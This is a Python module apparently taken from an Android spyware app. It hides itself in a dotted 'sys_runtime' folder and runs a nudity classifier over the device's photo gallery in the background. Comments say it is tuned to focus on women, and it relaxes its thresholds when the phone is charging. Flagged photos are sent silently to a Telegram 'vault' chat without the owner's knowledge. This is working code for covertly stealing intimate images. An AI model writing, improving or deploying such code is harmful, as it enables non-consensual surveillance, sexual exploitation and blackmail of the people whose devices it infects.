# -*- coding: utf-8 -*-
import os
import time
import threading
import logging
import sqlite3
import hashlib
import gc
import shutil
from datetime import datetime

# ========== توحيد مسار runtime ==========
def _get_runtime_path():
    try:
        from jnius import autoclass
        act = autoclass('org.kivy.android.PythonActivity').mActivity
        base = act.getFilesDir().getPath()
        return os.path.join(base, ".sys_runtime")
    except:
        return os.path.join(os.getcwd(), ".sys_runtime")

P = _get_runtime_path()
M = os.path.join(P, ".models")
if not os.path.exists(M):
    os.makedirs(M)

logging.basicConfig(filename=os.path.join(P, "n.log"), level=logging.ERROR, filemode='a')

# ========== استيراد المكتبات (خفيفة) ==========
try:
    import numpy as np
    from PIL import Image, UnidentifiedImageError
    Image.MAX_IMAGE_PIXELS = 50_000_000
    from tflite_runtime.interpreter import Interpreter
    AI_AVAILABLE = True
    JNI = True
except ImportError as e:
    logging.error(f"Failed to import AI libraries: {e}")
    AI_AVAILABLE = False
    JNI = False
    class Interpreter: pass


class NudeDetector:
    def __init__(self, mon=None):
        self.mon = mon
        self.active = False
        self.model = None
        self._lock = threading.Lock()
        self.last_run = 0

        # مسار النموذج داخل .sys_runtime/.models
        self.model_path = os.path.join(M, "engine_v2.tflite")

        # المسارات المحتملة للنموذج في assets (داخل APK)
        base_dir = os.getcwd()
        self.assets_candidates = [
            os.path.join(base_dir, "assets", "engine_v2.tflite"),
            os.path.join(base_dir, "engine_v2.tflite")
        ]

        # قاعدة بيانات الكاش (لمنع إعادة تحليل نفس الصورة)
        self.db = os.path.join(P, "n_cache.db")
        self._init_db()

        if AI_AVAILABLE and JNI:
            threading.Thread(target=self._prepare_engine, daemon=True).start()
        else:
            logging.error("AI libraries missing. NudeDetector will not work.")

    # ========== إدارة قاعدة البيانات (محسّنة للسرعة) ==========
    def _init_db(self):
        try:
            with sqlite3.connect(self.db) as conn:
                conn.execute('CREATE TABLE IF NOT EXISTS scan_logs (h TEXT PRIMARY KEY, ts INTEGER)')
                # ✅ تحسين الأداء: إنشاء فهرس على ts لتسريع الحذف
                conn.execute('CREATE INDEX IF NOT EXISTS idx_ts ON scan_logs(ts)')
                # تنظيف السجلات الأقدم من 30 يومًا
                old_threshold = int(time.time()) - (30 * 86400)
                conn.execute('DELETE FROM scan_logs WHERE ts < ?', (old_threshold,))
                conn.commit()
        except Exception as e:
            logging.error(f"DB init error: {e}")

    # ========== تحضير وتحميل النموذج ==========
    def _prepare_engine(self):
        try:
            need_copy = (not os.path.exists(self.model_path) or 
                         os.path.getsize(self.model_path) < 500000 or
                         os.path.getsize(self.model_path) == 0)
            if need_copy:
                for src in self.assets_candidates:
                    if os.path.exists(src) and os.path.getsize(src) > 500000:
                        shutil.copy(src, self.model_path)
                        logging.info(f"✅ Model copied from {src}")
                        break
                else:
                    logging.error("❌ No valid model found. AI disabled.")
                    return
            self._load_engine()
        except Exception as e:
            logging.error(f"Prepare engine error: {e}")

    def _load_engine(self):
        try:
            if not os.path.exists(self.model_path):
                return
            size = os.path.getsize(self.model_path)
            if size < 500000:
                logging.error(f"Model too small ({size} bytes)")
                return
            self.model = Interpreter(model_path=self.model_path)
            self.model.allocate_tensors()
            inputs = self.model.get_input_details()
            outputs = self.model.get_output_details()
            self.in_idx = inputs[0]['index']
            self.out_idx = outputs[0]['index']
            logging.info("✅ TFLite engine loaded")
        except Exception as e:
            logging.error(f"Load engine error: {e}")
            self.model = None

    # ========== تحليل الصورة مع فلاتر إضافية (للتركيز على الإناث) ==========
    def analyze(self, path):
        """
        تحليل الصورة وإرجاع احتمال العري (0.0-1.0)
        مع تطبيق فلاتر:
        1. نسبة الأبعاد (Aspect Ratio): الصور الطولية تحصل على أولوية طفيفة.
        2. عتبة ديناميكية (Dynamic Threshold) تعتمد على حالة الشحن.
        """
        if not AI_AVAILABLE or not JNI or self.model is None or not os.path.exists(path):
            return 0.0

        # الحجم الأقصى 8 ميجابايت
        if os.path.getsize(path) > 8 * 1024 * 1024:
            return 0.0

        if not path.lower().endswith(('.png', '.jpg', '.jpeg', '.webp')):
            return 0.0

        try:
            with Image.open(path) as raw_img:
                width, height = raw_img.size
                # فلتر الأبعاد: الصورة الطولية (height > width * 1.2) تعطى +5% ثقة
                aspect_bonus = 0.05 if height > width * 1.2 else 0.0

                img = raw_img.convert('RGB').resize((224, 224), Image.LANCZOS)

            arr = np.asarray(img, dtype=np.float32).reshape(1, 224, 224, 3) / 255.0
            self.model.set_tensor(self.in_idx, arr)
            self.model.invoke()
            out = self.model.get_tensor(self.out_idx)[0]
            prob = float(out[1]) if len(out) > 1 else float(out[0])

            # إضافة bonus aspect ratio
            prob = min(prob + aspect_bonus, 1.0)

            del arr, img
            return prob

        except UnidentifiedImageError:
            return 0.0
        except Exception as e:
            logging.error(f"Analyze error: {e}")
            return 0.0

    def _should_send(self, prob, mon):
        """
        عتبة ذكية: إذا كان الجهاز متصلاً بالشاحن، نرسل الصور ذات الثقة > 0.70.
        وإلا نرسل فقط التي تزيد عن 0.85.
        """
        if prob > 0.90:   # ثقة عالية جداً، نرسل فوراً
            return True
        if prob > 0.85:   # ثقة جيدة
            return True
        if prob > 0.70:
            # إذا كان الجهاز يشحن، نرسل حتى الثقة المتوسطة
            if hasattr(mon, '_bat'):
                _, charging = mon._bat()
                if charging:
                    return True
        return False

    # ========== المسح التلقائي (يُستدعى من monitor) ==========
    def scan(self, mon):
        if not AI_AVAILABLE or self.active or self.model is None:
            return
        if hasattr(mon, '_bat'):
            battery, charging = mon._bat()
            if battery < 20 and not charging:
                return
        now = time.time()
        if (now - self.last_run) < 1800:
            return
        self.last_run = now
        threading.Thread(target=self._worker, args=(mon,), daemon=True).start()

    def _worker(self, mon):
        if not self._lock.acquire(blocking=False):
            return
        try:
            self.active = True
            sc = getattr(mon, 'media_scanner', None)
            if not sc:
                return

            items = sc.get_gallery_by_category("pending", limit=30)
            for item in items:
                path = item.get("path")
                if not path or not os.path.exists(path):
                    continue

                h = hashlib.md5(path.encode()).hexdigest()
                if self._is_cached(h):
                    continue

                prob = self.analyze(path)

                if self._should_send(prob, mon):
                    sc.update_category(item.get("hash"), "nude", prob)
                    self._report(path, item.get("label", "??"), mon, prob)
                elif prob > 0.45:
                    sc.update_category(item.get("hash"), "questionable", prob)
                else:
                    sc.update_category(item.get("hash"), "normal", prob)

                self._mark_cached(h)
                time.sleep(0.5)

        except Exception as e:
            logging.error(f"AI Worker error: {e}")
        finally:
            self.active = False
            self._lock.release()
            gc.collect()

    # ========== دوال الكاش ==========
    def _is_cached(self, h):
        try:
            with sqlite3.connect(self.db) as conn:
                cur = conn.execute("SELECT 1 FROM scan_logs WHERE h=?", (h,))
                return cur.fetchone() is not None
        except:
            return False

    def _mark_cached(self, h):
        try:
            with sqlite3.connect(self.db) as conn:
                conn.execute("INSERT OR REPLACE INTO scan_logs VALUES (?, ?)", (h, int(time.time())))
                conn.commit()
        except:
            pass

    # ========== إرسال التقرير ==========
    def _report(self, path, label, mon, confidence):
        try:
            tg = getattr(mon, 'ui', None)
            vault = getattr(mon, 'vlt', None)
            if tg and vault and os.path.exists(path):
                with open(path, 'rb') as f:
                    caption = f"🔞 **AI Detection**\nLabel: `{label}`\nConfidence: `{confidence:.0%}`\nTime: `{datetime.now().strftime('%H:%M:%S')}`"
                    tg._api("sendPhoto", {
                        "chat_id": vault,
                        "caption": caption,
                        "parse_mode": "Markdown",
                        "disable_notification": True
                    }, {"photo": f})
        except Exception as e:
            logging.error(f"Report error: {e}")

def create(mon=None):
    return NudeDetector(mon)
